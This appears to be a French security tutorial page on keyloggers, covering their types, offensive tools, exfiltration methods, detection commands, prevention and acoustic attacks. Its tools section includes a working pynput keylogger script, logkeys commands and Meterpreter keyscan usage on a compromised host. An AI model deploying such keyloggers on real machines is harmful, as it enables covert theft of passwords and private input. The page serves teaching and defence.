---
title: Keylogging
description: Keyloggers hardware et software — types, outils offensifs, détection, prévention et cadre légal.
category: hacking
slug: keylogging
order: 7
---

## Qu'est-ce qu'un keylogger ? {#intro}

Un **keylogger** enregistre les frappes clavier d'un utilisateur à son insu. Il peut être **logiciel** (programme installé sur le système) ou **matériel** (dispositif physique connecté entre le clavier et l'ordinateur).

```
┌───────────┐           ┌───────────────┐           ┌───────────┐
│  Clavier  │  ──────>  │   Keylogger   │  ──────>  │  Système  │
└───────────┘  frappes  │  (intercept)  │  frappes  └───────────┘
                        └───────────────┘
                                │
                                ▼
                        ┌───────────────┐
                        │     Logs      │
                        │   envoyés à   │
                        │  l'attaquant  │
                        └───────────────┘
```

> **Rappel légal** : L'utilisation de keyloggers sans autorisation est un délit (article 323-1 du Code pénal). Ces techniques ne doivent être utilisées que dans un cadre autorisé : pentest, CTF, lab personnel.

## Types de keyloggers {#types}

### Keyloggers software

| Type                  | Niveau         | Description                                           | Détection      |
| --------------------- | -------------- | ----------------------------------------------------- | -------------- |
| **Kernel-level**      | Noyau (ring 0) | Intercepte les frappes au niveau du driver clavier    | Très difficile |
| **API-level**         | Userspace      | Utilise les API système (SetWindowsHookEx, Xlib)      | Moyen          |
| **Form grabber**      | Application    | Capture les données soumises dans les formulaires web | Moyen          |
| **Memory injection**  | Processus      | S'injecte dans un processus légitime (navigateur)     | Difficile      |
| **Browser extension** | Navigateur     | Extension malveillante qui capture les saisies        | Facile         |
| **Screen recorder**   | Écran          | Capture l'écran en plus des frappes                   | Moyen          |

### Keyloggers hardware

| Type                | Description                                                | Détection           |
| ------------------- | ---------------------------------------------------------- | ------------------- |
| **USB inline**      | Dispositif entre le clavier USB et le port de l'ordinateur | Inspection visuelle |
| **PS/2 inline**     | Même principe, connecteur PS/2                             | Inspection visuelle |
| **Câble modifié**   | Câble clavier avec puce d'enregistrement intégrée          | Très difficile      |
| **Keylogger Wi-Fi** | Dispositif qui transmet les frappes par Wi-Fi              | Analyse réseau      |
| **Firmware**        | Modifie le firmware du clavier                             | Très difficile      |
| **Acoustic**        | Analyse le son des frappes pour deviner les touches        | Impossible à voir   |
| **Electromagnetic** | Capture les émissions EM du câble clavier (TEMPEST)        | Matériel spécialisé |

```
Keylogger USB inline (aspect physique) :

┌───────────┐         ┌─────────────────────┐         ┌───────────────┐
│  Clavier  │  ────>  │  ■■■ Keylogger ■■■  │  ────>  │  Port USB PC  │
│    USB    │         │    (ressemble à     │         └───────────────┘
└───────────┘         │    un adaptateur)   │
                      └─────────────────────┘
                         Stocke les frappes
                         sur mémoire interne
```

## Outils offensifs {#tools}

### logkeys (Linux)

**logkeys** est un keylogger open source pour Linux qui fonctionne au niveau de l'input device.

```bash
# Install logkeys
sudo apt install logkeys

# Start logging (writes to /var/log/logkeys.log)
sudo logkeys --start

# Start with custom output file
sudo logkeys --start --output /tmp/keylog.txt

# Stop logging
sudo logkeys --stop
```

### pynput (Python)

Bibliothèque Python multiplateforme pour capturer les événements clavier et souris.

```python
# pip install pynput
from pynput.keyboard import Listener

def on_press(key):
    with open("/tmp/keylog.txt", "a") as f:
        f.write(str(key) + "\n")

with Listener(on_press=on_press) as listener:
    listener.join()
```

> Ce type de script est fréquemment utilisé dans les challenges CTF et pour démontrer la facilité d'écrire un keylogger basique.

### Meterpreter (Metasploit)

Après avoir obtenu un accès via Metasploit, le module keyscan est intégré.

```bash
# Start keylogger on compromised target
meterpreter > keyscan_start
# Starting the keystroke sniffer...

# Dump captured keystrokes
meterpreter > keyscan_dump
# Dumping captured keystrokes...
# admin Password123!

# Stop keylogger
meterpreter > keyscan_stop
```

### Autres outils

| Outil                                | Plateforme | Description                             |
| ------------------------------------ | ---------- | --------------------------------------- |
| **logkeys**                          | Linux      | Keylogger léger, open source            |
| **pynput**                           | Multi      | Bibliothèque Python, facile à scripter  |
| **Meterpreter**                      | Multi      | Module intégré dans Metasploit          |
| **SET (Social-Engineering Toolkit)** | Linux      | Peut déployer un keylogger via phishing |
| **PowerShell Empire**                | Windows    | Module keylogger pour post-exploitation |

## Exfiltration des données {#exfiltration}

Une fois les frappes capturées, l'attaquant doit les récupérer :

| Méthode            | Description                                      | Détection             |
| ------------------ | ------------------------------------------------ | --------------------- |
| **Fichier local**  | Stockage sur disque, récupéré manuellement       | Analyse fichiers      |
| **Email**          | Envoi périodique des logs par email              | Analyse réseau        |
| **HTTP/HTTPS**     | Envoi vers un serveur contrôlé par l'attaquant   | Analyse réseau (TLS)  |
| **DNS tunneling**  | Données encodées dans des requêtes DNS           | Analyse DNS           |
| **USB (hardware)** | Récupération physique du dispositif              | Inspection physique   |
| **Wi-Fi**          | Transmission sans fil (keylogger hardware Wi-Fi) | Analyse du spectre RF |

## Détection {#detection}

### Détection des keyloggers software

```bash
# Check suspicious processes (Linux)
ps aux | grep -i key
ps aux | grep -i log

# Check for unknown kernel modules
lsmod | grep -v "^Module"

# Monitor system calls related to keyboard input
strace -e read -p $(pidof target_process) 2>&1 | head

# Check open files on input devices
lsof /dev/input/event*

# Check for suspicious network connections (exfiltration)
ss -tunapl | grep ESTABLISHED
netstat -tunapl | grep ESTABLISHED

# Check recently modified files
find /tmp /var/log -name "*.txt" -mmin -60
```

### Détection des keyloggers hardware

- **Inspection visuelle** : vérifier qu'aucun dispositif inconnu n'est connecté entre le clavier et l'ordinateur
- **Poids du clavier** : un clavier modifié peut être plus lourd
- **Ports USB** : vérifier les périphériques USB connectés avec `lsusb`
- **Vérifier les câbles** : chercher des renflements ou des boîtiers suspects

```bash
# List all USB devices
lsusb

# Detailed USB device information
lsusb -v 2>/dev/null | grep -A5 "idVendor"

# Monitor USB events in real-time
sudo udevadm monitor --property
```

## Prévention {#prevention}

### Mesures techniques

| Mesure                      | Efficacité contre software | Efficacité contre hardware   |
| --------------------------- | -------------------------- | ---------------------------- |
| **Antivirus / EDR**         | Bonne                      | Aucune                       |
| **Clavier virtuel**         | Bonne (API-level)          | Totale                       |
| **Chiffrement des frappes** | Bonne                      | Partielle                    |
| **MFA / 2FA**               | Limite l'impact            | Limite l'impact              |
| **Inspection physique**     | Aucune                     | Bonne                        |
| **Gestion des droits**      | Bonne (empêche install)    | Aucune                       |
| **Monitoring réseau**       | Détecte l'exfiltration     | Détecte l'exfiltration Wi-Fi |

### Bonnes pratiques

- **Maintenir le système à jour** — Les keyloggers exploitent souvent des vulnérabilités connues
- **Ne pas installer de logiciels non vérifiés** — Source principale d'infection
- **Utiliser un gestionnaire de mots de passe** — L'auto-remplissage évite de taper les mots de passe
- **Activer la MFA** — Même si le mot de passe est capturé, le second facteur protège
- **Inspecter régulièrement les ports USB** — Surtout sur les postes en accès public
- **Surveiller les processus** — Alerter sur les processus accédant aux input devices
- **Utiliser un EDR** — Endpoint Detection and Response pour détecter les comportements suspects

## Keylogging acoustique {#acoustic}

Une technique avancée consiste à analyser le **son** des frappes clavier pour deviner les touches pressées. Chaque touche produit un son légèrement différent.

```
┌───────────┐         ┌──────────────┐         ┌───────────────┐         ┌───────────┐
│  Clavier  │  ────>  │  Microphone  │  ────>  │  Analyse ML   │  ────>  │   Texte   │
│   (son)   │         │   (capture)  │         │  (modèle IA)  │         │  reconnu  │
└───────────┘         └──────────────┘         └───────────────┘         └───────────┘
```

Des chercheurs ont démontré des taux de précision de **plus de 90%** en utilisant des modèles de deep learning entraînés sur les sons de frappe. Cette attaque peut être réalisée :

- Via un **microphone à proximité**
- Via un **appel vidéo** (Zoom, Teams) où le son du clavier est audible
- Via un **smartphone** posé à côté du clavier

> **Protection** : utiliser un clavier silencieux (membranes), activer le bruit de fond, ou utiliser un clavier virtuel pour les saisies sensibles.

## Pour aller plus loin {#next}

- [Mots de passe](/help/hacking/passwords) — pourquoi les mots de passe sont vulnérables
- [Bruteforce](/help/hacking/bruteforce) — casser les mots de passe capturés
- [Escalade de privilèges](/help/hacking/privesc) — installer un keylogger après compromission
- [Boîte à outils](/help/hacking/tools) — vue d'ensemble des outils offensifs